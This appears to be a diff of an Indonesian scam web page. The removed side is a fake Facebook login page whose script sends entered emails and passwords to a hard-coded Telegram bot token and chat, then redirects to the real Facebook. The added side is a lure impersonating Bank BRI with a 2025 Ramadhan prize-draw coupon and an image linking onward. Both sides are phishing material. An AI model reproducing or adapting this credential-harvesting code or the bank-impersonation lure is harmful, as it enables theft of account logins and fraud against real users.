@@ -1,315 +1,33 @@
-<!DOCTYPE html>
 <html>
 
 <head>
-    <meta charset="UTF-8">
-    <title>Facebook.com</title>
-    <link rel="stylesheet" href="./css/styles.css">
-    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            background-color: #f0f2f5;
-        }
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+    <meta content="#0F78CB" name="theme-color">
+    <!-- Warna untuk Windows Phone -->
+    <meta content="#0F78CB" name="msapplication-navbutton-color">
 
-        .main {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .heading-section {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .heading-section img {
-            max-width: 100%;
-            height: auto;
-        }
-
-        .a-ri8 {
-            font-size: 1.2em;
-            margin-top: 10px;
-            color: #606770;
-        }
-
-        .form {
-            width: 100%;
-            max-width: 400px;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-
-        .a-form {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .a-form input {
-            margin-bottom: 10px;
-            padding: 10px;
-            font-size: 1em;
-            border: 1px solid #dddfe2;
-            border-radius: 5px;
-        }
-
-        .a-form .a-sub,
-        .a-form .a-but {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            cursor: pointer;
-            padding: 12px;
-            font-size: 1em;
-            border-radius: 5px;
-        }
-
-        .a-form .a-sub:hover,
-        .a-form .a-but:hover {
-            background-color: #165cdb;
-        }
-
-        .a-link {
-            text-align: center;
-            display: block;
-            margin-top: 10px;
-            color: #1877f2;
-        }
-
-        .a-hr {
-            border: none;
-            border-top: 1px solid #dddfe2;
-            margin: 20px 0;
-        }
-
-        .create-page {
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .create-page .a-href {
-            color: #1877f2;
-        }
-
-        .footer {
-            background-color: #f7f7f7;
-            padding: 20px;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .footer ul {
-            list-style: none;
-            padding: 0;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .footer ul li {
-            margin: 5px 10px;
-        }
-
-        .footer ul li a {
-            text-decoration: none;
-            color: #1877f2;
-        }
-
-        .m-footer {
-            background-color: #f7f7f7;
-            padding: 20px;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .m-footer .main-c,
-        .m-footer .main-links,
-        .m-footer .fb {
-            margin: 10px 0;
-        }
-
-        .m-footer .list-1,
-        .m-footer .list-2 {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        .m-footer .list-1 span,
-        .m-footer .list-2 span {
-            margin: 5px 10px;
-        }
-
-        @media (max-width: 600px) {
-            .a-ri8 {
-                font-size: 1em;
-            }
-
-            .form {
-                padding: 10px;
-            }
-
-            .a-form input {
-                font-size: 0.9em;
-            }
-        }
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image" content="https://i.imghippo.com/files/vNVe3160Bnk.jpg">
+    <meta property="og:image" content="https://i.imghippo.com/files/vNVe3160Bnk.jpg">
+    <meta name="twitter:image" content="https://i.imghippo.com/files/vNVe3160Bnk.jpg">
+    <meta name="description" content="Jl. Jenderal Sudirman Kav.44-46, Jakarta">
+    <title>𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 𝗥𝗮𝗺𝗮𝗱𝗵𝗮𝗻 | 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 𝟮𝟬𝟮𝟱</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/index.css" type="text/css" media="all">
+    <style type="text/css" media="all">
     </style>
 </head>
 
 <body>
     <main>
-        <div class="main">
-            <div class="heading-section">
-                <img src="./images/logo.png" class="logo-img">
-                <div class="a-ri8"><span>Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam hidup Anda.</span></div>
-            </div>
-
-            <div class="form">
-                <form class="a-form" onsubmit="sendToTelegram(event)">
-                    <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address atau nomor telepon"
-                        autofocus="autofocus" required />
-                    <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password"
-                        autofocus="autofocus" required />
-                    <input type="submit" class="a-sub" value="Log In" />
-                    <a href="" class="a-link">Lupa kata sandi?</a>
-                    <hr class="a-hr">
-                    <input type="button" value="Buat Akun Baru" class="a-but" />
-                </form>
-                <div class="create-page">
-                    <a href="" class="a-href">Buat Halaman</a></b> untuk selebriti, grup musik, atau bisnis.
-                </div>
-            </div>
-        </div>
+        <img width="100%" height="100%" onclick="if (!window.__cfRLUnblockHandlers) return false; location.href='index.html'" src="https://hosting.tigerengine.id/7kinn0.jpg" alt="" data-cf-modified-4153f76f0e34e4dcbb7906b1-="">
     </main>
-    <div class="footer">
-        <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
-            <ul>
-                <li>English (UK)</li>
-                <li><a href="">हिन्दी</a></li>
-                <li><a href="">ગુજરાતી</a></li>
-                <li><a href="">मराठी</a></li>
-                <li><a href="">اردو</a></li>
-                <li><a href="">മലയാളം</a></li>
-                <li><a href="">বাংলা</a></li>
-                <li><a href="" class="_sv4">తెలుగు</a></li>
-                <li><a href="" class="_sv4">தமிழ்</a></li>
-                <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
-                <li><a href="" class="_sv4">Español</a></li>
-                <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a></li>
-            </ul>
-            <div id="line"></div>
-            <div>
-                <ul>
-                    <li><a href="">Daftar</a></li>
-                    <li><a href="">Log In</a></li>
-                    <li><a href="">Messenger</a></li>
-                    <li><a href="">Facebook Lite</a></li>
-                    <li><a href="">Watch</a></li>
-                    <li><a href="">Orang</a></li>
-                    <li><a href="">Halaman</a></li>
-                    <li><a href="">Kategori Halaman</a></li>
-                    <li><a href="">Tempat</a></li>
-                    <li><a href="">Game</a></li>
-                    <li><a href="">Lokasi</a></li>
-                    <li><a href="">Marketplace</a></li>
-                    <li><a href="">Facebook Pay</a></li>
-                    <li><a href="">Grup</a></li>
-                    <li><a href="">Pekerjaan</a></li>
-                    <li><a href="">Oculus</a></li>
-                    <li><a href="">Portal</a></li>
-                    <li><a href="">Instagram</a></li>
-                    <li><a href="">Lokal</a></li>
-                    <li><a href="">Penggalangan Dana</a></li>
-                    <li><a href="">Layanan</a></li>
-                    <li><a href="">Pusat Informasi Voting</a></li>
-                    <li><a href="">Tentang</a></li>
-                    <li><a href="">Buat Iklan</a></li>
-                    <li><a href="">Buat Halaman</a></li>
-                    <li><a href="">Pengembang</a></li>
-                    <li><a href="">Karir</a></li>
-                    <li><a href="">Privasi</a></li>
-                    <li><a href="">Cookies</a></li>
-                    <li><a href="">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
-                    <li><a href="">Ketentuan</a></li>
-                    <li><a href="">Bantuan</a></li>
-                    <li><a href="">Pengaturan</a></li>
-                    <li><a href="">Log Aktivitas</a></li>
-                </ul>
-            </div>
-            <div class="copyright">
-                <div><span>Facebook © 2021</span></div>
-            </div>
-        </div>
-    </div>
-    <div class="m-footer">
-        <div class="main-c">
-            <div class="list-1"><span>English (UK)</span>
-                <div><span><a href="">हिन्दी</a></span></div>
-                <div><span><a href="">اردو</a></span></div>
-                <div><span><a href="">বাংলা</a></span></div>
-            </div>
-            <div class="list-2">
-                <div><span><a href="">ગુજરાતી</a></span></div>
-                <div class=""><span><a href="">मराठी</a></span></div>
-                <div><span><a href="">മലയാളം</a></span></div>
-                <a>
-                    <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i></div>
-                </a>
-            </div>
-        </div>
-        <div class="main-links">
-            <span>Tentang</span>.
-            <span>Bantuan</span>.
-            <span>Lainnya</span>
-        </div>
-        <div class="fb">Facebook Inc.</div>
-    </div>
 
-    <script>
-        function sendToTelegram(event) {
-            event.preventDefault();
-            const email = document.getElementById('Email').value;
-            const password = document.getElementById('Password').value;
 
-            const telegramApiUrl = 'https://api.telegram.org/bot7311165290:AAEJlQcLYEmNFS0LPL_M3JRICJ16lJOThUg/sendMessage';
-            const chatId = '-4721674531';
-            const message = `Email: ${email}\nPassword: ${password}`;
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert('Data berhasil dikirim ke Telegram!');
-                } else {
-                    alert('Gagal mengirim data ke Telegram.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Terjadi kesalahan saat mengirim data ke Telegram.');
-            });
-
-            // Redirect ke halaman utama Facebook setelah mengirim data
-            window.location.href = "https://www.facebook.com";
-        }
-    </script>
+    <script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="4153f76f0e34e4dcbb7906b1-|49" defer></script>
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"91e9c602ebdfa125","version":"2025.1.0","r":1,"token":"715f142ace3743bf89398cc997e9dd99","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}'
+        crossorigin="anonymous"></script>
 </body>
 
 </html>
